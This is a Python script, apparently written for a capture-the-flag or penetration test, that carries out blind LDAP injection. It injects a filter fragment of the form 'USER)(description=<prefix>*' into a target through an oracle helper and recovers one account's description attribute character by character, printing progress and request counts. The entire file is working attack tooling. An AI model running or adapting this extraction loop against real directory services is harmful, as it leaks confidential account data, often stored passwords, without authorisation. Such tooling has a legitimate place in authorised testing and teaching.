#!/usr/bin/env python3
"""Extract description for one account: inject 'USER)(description=<prefix>*'."""
import sys
import time

import pool_extract as P

P.init_pool()

FULL = (list("abcdefghijklmnopqrstuvwxyz") + list("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        + list("0123456789") + list("_-!@#$%^&*+=.,?/|~ ()[]{}:;'\"`")
        + ["\n", "\r", "\t", " "])


def owner_has(user, value):
    return P.oracle(f"{user})(description={P.esc(value)}*")


def scan(user, prefix="", maxlen=60):
    if not owner_has(user, ""):
        print(f"  {user} has no description", flush=True)
        return None
    val = prefix
    t0 = time.time()
    while len(val) < maxlen:
        hit = None
        for c in FULL:
            if owner_has(user, val + c):
                hit = c
                break
        if hit is None:
            break
        val += hit
        print(f"    {val!r}  [{P.REQ[0]} req, {time.time()-t0:.0f}s]", flush=True)
    print(f"  END for {user}: {val!r}", flush=True)
    return val


if __name__ == "__main__":
    user = sys.argv[1]
    pre = sys.argv[2] if len(sys.argv) > 2 else ""
    v = scan(user, pre)
    print(f"\n{user} description = {v!r}", flush=True)
    print(f"requests: {P.REQ[0]}", flush=True)
